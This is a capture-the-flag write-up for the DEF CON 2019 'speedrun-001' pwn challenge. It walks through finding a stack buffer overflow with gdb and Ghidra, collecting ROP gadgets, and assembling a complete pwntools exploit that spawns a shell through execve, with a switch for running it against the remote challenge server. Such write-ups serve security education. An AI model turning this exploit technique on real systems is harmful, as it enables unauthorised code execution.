# speedrun-001 - Defcon 2019
Category: Pwn, Difficulty: Hard

## Description

*The Fast and the Furious*

*For all speedrun challenges, flag is in /flag*

*https://s3.us-east-2.amazonaws.com/oooverflow-challs/c3174710ab5f90f46fdf555ae346b6a40fc647ef6aa51d05c2b19379d4c06048/speedrun-001*

*speedrun-001.quals2019.oooverflow.io 31337*

*Attached file [speedrun-001](speedrun-001)*

## speedrun-001 Solution

Let's take a look at the binary using ```checksec```:
```console
┌─[evyatar@parrot]─[/defcon2019/speedrun-001] 
└──╼ $ checksec speedrun-001
[*] '/defcon2019/speedrun-001/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we are dealing with 64bit statically compiled binary, with [NX (Non-Executable stack) Enabled](https://en.wikipedia.org/wiki/NX_bit) which means that the stack memory region is not executable.

By running the binary we can see:
```console
┌─[evyatar@parrot]─[/defcon2019/speedrun-001] 
└──╼ $ ./speedrun-001 
Hello brave new challenger
Any last words?
AAAAAAAA
This will be the last thing that you say: AAAAAAAA

Alas, you had no luck today.
```

Let's look at the binary using ```Ghidra``` (search for string "Any last words?"):
```c
void FUN_00400b60(void)

{
  undefined auStack1032 [1024];
  
  FUN_00410390("Any last words?");
  FUN_004498a0(0,auStack1032,2000);
  FUN_0040f710("This will be the last thing that you say: %s\n",auStack1032);
  return;
}

```

As we can see it's ask for input (1024 bytes) and print our input to stdout.

Let's check if we can override rip using ```gdb```, Insert 2000 times A charcater as input:
```asm

gef➤  r
Starting program: /defcon2019/speedrun-001/speedrun-001
Hello brave new challenger
Any last words?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0
@

Program received signal SIGSEGV, Segmentation fault.

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x7fe             
$rbx   : 0x0000000000400400  →   sub rsp, 0x8
$rcx   : 0x0               
$rdx   : 0x00000000006bbd30  →  0x0000000000000000
$rsp   : 0x00007fffffffdde8  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x0               
$rdi   : 0x1               
$rip   : 0x0000000000400bad  →   ret 
$r8    : 0x7fe             
$r9    : 0x7fe             
$r10   : 0x00007fffffffbb4d  →  0x000000000000000a
$r11   : 0x246             
$r12   : 0x00000000004019a0  →   push rbp
$r13   : 0x0               
$r14   : 0x00000000006b9018  →  0x0000000000443e60  →   mov rcx, rsi
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdde8│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $rsp
0x00007fffffffddf0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffddf8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde00│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde08│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde10│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde18│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde20│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ba6                  call   0x40f710
     0x400bab                  nop    
     0x400bac                  leave  
 →   0x400bad                  ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-001", stopped 0x400bad in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400bad → ret 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400bad in ?? ()
gef➤  
```

Now Let's check the frame using ```info frame```:
```asm
gef➤  info frame
Stack level 0, frame at 0x7fffffffdde8:
 rip = 0x400bad; saved rip = 0x4141414141414141
 called by frame at 0x7fffffffddf8
 Arglist at 0x7fffffffdde0, args: 
 Locals at 0x7fffffffdde0, Previous frame's sp is 0x7fffffffddf0
 Saved registers:
  rip at 0x7fffffffdde8
```

So we can override rip ``` rip = 0x4141414141414141```, We need to find the offset between out input to RIP.

First, Let's run it again and insert 8 times A as input, then search our string on stack using ```search-pattern```:
```asm
gef➤  b *0x400b90
Breakpoint 1 at 0x400b90
gef➤  r
Starting program: /defcon2019/speedrun-001/speedrun-001
Hello brave new challenger
Any last words?
AAAAAAAA

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x9               
$rbx   : 0x0000000000400400  →   sub rsp, 0x8
$rcx   : 0x00000000004498ae  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x7d0             
$rsp   : 0x00007fffffffd9e0  →  "AAAAAAAA\n"
$rbp   : 0x00007fffffffdde0  →  0x00007fffffffde00  →  0x0000000000401900  →   push r15
$rsi   : 0x00007fffffffd9e0  →  "AAAAAAAA\n"
$rdi   : 0x0               
$rip   : 0x0000000000400b90  →   lea rax, [rbp-0x400]
$r8    : 0xf               
$r9    : 0x00000000006bd880  →  0x00000000006bd880  →  [loop detected]
$r10   : 0x4               
$r11   : 0x246             
$r12   : 0x00000000004019a0  →   push rbp
$r13   : 0x0               
$r14   : 0x00000000006b9018  →  0x0000000000443e60  →   mov rcx, rsi
$r15   : 0x0               
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9e0│+0x0000: "AAAAAAAA\n"	 ← $rsp, $rsi
0x00007fffffffd9e8│+0x0008: 0x000000000000000a
0x00007fffffffd9f0│+0x0010: 0x0000000000000000
0x00007fffffffd9f8│+0x0018: 0x0000000000000000
0x00007fffffffda00│+0x0020: 0x0000000000000000
0x00007fffffffda08│+0x0028: 0x0000000000000000
0x00007fffffffda10│+0x0030: 0x0000000000000000
0x00007fffffffda18│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400b83                  mov    rsi, rax
     0x400b86                  mov    edi, 0x0
     0x400b8b                  call   0x4498a0
●→   0x400b90                  lea    rax, [rbp-0x400]
     0x400b97                  mov    rsi, rax
     0x400b9a                  lea    rdi, [rip+0x919b7]        # 0x492558
     0x400ba1                  mov    eax, 0x0
     0x400ba6                  call   0x40f710
     0x400bab                  nop    
───────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "speedrun-001", stopped 0x400b90 in ?? (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400b90 → lea rax, [rbp-0x400]
[#1] 0x400c1d → mov eax, 0x0
[#2] 0x4011a9 → mov edi, eax
[#3] 0x400a5a → hlt 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x0000000000400b90 in ?? ()
gef➤  search-pattern AAAAAAAA
[+] Searching 'AAAAAAAA' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffd9e0 - 0x7fffffffd9ea  →   "AAAAAAAA\n" 
gef➤  info frame
Stack level 0, frame at 0x7fffffffddf0:
 rip = 0x400b90; saved rip = 0x400c1d
 called by frame at 0x7fffffffde10
 Arglist at 0x7fffffffd9d8, args: 
 Locals at 0x7fffffffd9d8, Previous frame's sp is 0x7fffffffddf0
 Saved registers:
  rbp at 0x7fffffffdde0, rip at 0x7fffffffdde8
gef➤  

```

So we can see our input start from ```0x7fffffffd9e0``` and rip located on 0x7fffffffdde8 so ```0x7fffffffdde8-0x7fffffffd9e0=0x408```.

Now, We need to find the ROP gadgets to get RCE.

We want to call to system function ```execve```, By looking on [the following website](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/):
```
%rax	System call		%rdi					%rsi						%rdx
59		sys_execve		const char *filename	const char *const argv[]	const char *const envp[]
```

We need to set the following values to the registers above:
```asm
rax:  0x3b (59)         Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
```

To do this, we will need gadgets to control those four register.
Let's find our gadgets using [ROPGadget](https://github.com/JonathanSalwan/ROPgadget):

```asm
$ python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
0x0000000000415662 : add ch, al ; pop rax ; ret
0x0000000000415661 : cli ; add ch, al ; pop rax ; ret
0x00000000004a9321 : in al, 0x4c ; pop rax ; retf
0x0000000000415664 : pop rax ; ret
0x000000000048cccb : pop rax ; ret 0x22
0x00000000004a9323 : pop rax ; retf
0x00000000004758a3 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret

$ python ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"
0x0000000000423788 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; pop rdi ; ret
0x000000000042378b : fsubp st(0) ; pop rdi ; ret
0x0000000000400686 : pop rdi ; ret

$ python ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
0x000000000046759d : add byte ptr [rbp + rcx*4 + 0x35], cl ; pop rsi ; ret
0x000000000048ac68 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
0x000000000044be39 : pop rdx ; pop rsi ; ret
0x00000000004101f3 : pop rsi ; ret

$ python ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
0x00000000004a8881 : js 0x4a8901 ; pop rdx ; retf
0x00000000004498b5 : pop rdx ; ret
0x000000000045fe71 : pop rdx ; retf
```

So we found 4 relevant gadgets:
```asm
0x415664 : pop rax ; ret
0x400686 : pop rdi ; ret
0x4101f3 : pop rsi ; ret
0x4498b5 : pop rdx ; ret
```

Next we will need a gadget which will write the string "/bin/sh" somewhere to memory.

For this we need gadgets with a mov instruction:
```asm
$ python ROPgadget.py --binary speedrun-001 | grep "mov" | less
...
0x000000000048d251 : mov qword ptr [rax], rdx ; ret
```

The gadget above will allow us to write 8 byte value stored in ```rdx``` to whatever address is pointed to by ```rax``` register.

We need to find where we can write our 8 bytes, Let's run ```gdb vmmap``` to look on binary memory region:
```asm
gef➤  vmmap 
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /defcon2019/speedrun-001/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /defcon2019/speedrun-001/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
0x00007ffff7ffb000 0x00007ffff7ffe000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  

```

So we can see we have write permission on:
```asm
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /defcon2019/speedrun-001/speedrun-001
```

Let's find where exactly we can write 8 bytes:
```asm
gef➤  x/10g 0x6b6000
0x6b6000:	0x0	0x0
0x6b6010:	0x0	0x0
0x6b6020:	0x0	0x0
0x6b6030:	0x0	0x0
0x6b6040:	0x0	0x0
```

So we can use ```0x6b6000``` address to write 8 bytes.

Lastly we just need to find a gadget for syscall:
```asm
$    python ROPgadget.py --binary speedrun-001 | grep ": syscall"
0x000000000040129c : syscall
```

So we have the following gadgets:
```asm
rax:  0x3b (59)         Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables

0x48d251 : mov qword ptr [rax], rdx ; ret

0x40129c : syscall

0x6b6000 : memory region to write 8 bytes
```

Let's write everything together using ```pwntools```:
```python
from pwn import *

popRax=p64(0x415664)
popRdi=p64(0x400686)
popRsi=p64(0x4101f3)
popRdx=p64(0x4498b5)
syscallGadget=p64(0x40129c)
movGadget=p64(0x48d251)

payload=("A"*0x408).encode('utf-8')
```

So first we just write the addresses on each gadget that we found before.

```python

payload+=popRdx # pop rdx ; ret
payload+=p64(0x0068732f6e69622f) #string of /bin/sh
payload+=popRax
payload+=p64(0x6b6000)
payload+=movGadget # mov qword ptr [rax], rdx ; ret
```

Next, we add to our payload the instructions above, we put into ```rdx``` register "/bin/sh\x00", then put into ```rax``` the memory address and then use ```move``` to move the value stored in ```rdx``` to address is pointed by ```rax``` register which is ```0x6b6000```.

```python
#Call to system
'''
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
'''

payload+=popRax
payload+=p64(0x3b)
payload+=popRdi
payload+=p64(0x6b6000)
payload+=popRsi
payload+=p64(0x00)
payload+=popRdx
payload+=p64(0x00)

payload+=syscallGadget

```

We move into ```rax``` register ```0x3b``` which is ```execv```, write the pointer "/bin/sh" into ```rdi``` register and write 0 value to ```rsi```,```rdx``` register.

Now we just need to write everything together to get shell:
```python
from pwn import *

popRax=p64(0x415664)
popRdi=p64(0x400686)
popRsi=p64(0x4101f3)
popRdx=p64(0x4498b5)
syscallGadget=p64(0x40129c)
movGadget=p64(0x48d251)

payload=("A"*0x408).encode('utf-8')

#Call to system
'''
rax:  0x3b              Specify execve syscall
rdi:  ptr to "/bin/sh"  Specify file to run
rsi:  0x0               Specify no arguments
rdx:  0x0               Specify no environment variables
'''

payload+=popRdx # pop rdx ; ret
payload+=p64(0x0068732f6e69622f) #/bin/sh
payload+=popRax
payload+=p64(0x6b6000)
payload+=movGadget # mov


payload+=popRax
payload+=p64(0x3b)
payload+=popRdi
payload+=p64(0x6b6000)
payload+=popRsi
payload+=p64(0x00)
payload+=popRdx
payload+=p64(0x00)

payload+=syscallGadget


p = process('./speedrun-001')
data=p.recvuntil("?")
print(data)
p.send(payload)
p.interactive()
```

Run it:
```console
┌─[evyatar@parrot]─[/defcon2019/speedrun-001] 
└──╼ $ python speedexploit.py
[+] Starting local process './speedrun-001': pid 17800
Hello brave new challenger
Any last words?
[*] Switching to interactive mode

This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb5\x98D
$ ls
speedrun-001	speedexploit.py
$ whoami
evyatar
```

Just like that, we popped a shell.

Run it against the server (replace ```p = process('./speedrun-001')``` to ```p = remote('speedrun-001.quals2019.oooverflow.io' ,31337)``` to get the flag.
